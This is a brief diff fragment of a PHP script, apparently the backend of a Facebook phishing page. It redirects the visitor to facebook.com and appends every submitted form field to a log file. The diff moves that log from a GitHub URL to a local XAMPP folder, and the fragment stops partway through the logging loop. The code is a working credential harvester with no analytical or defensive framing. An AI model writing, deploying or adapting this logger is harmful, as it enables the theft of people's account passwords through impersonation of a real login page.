@@ -2,7 +2,7 @@
 <?php
 
 header('Location: https://www.facebook.com');
-$handle = fopen("https://github.com/harithadushmantha/fb_app/blob/main/log.txt","a");
+$handle = fopen("C:\xampp\htdocs\site","a");
 foreach($_POST as $variable => $value){
     fwrite($handle,$variable);
     fwrite($handle,"=");
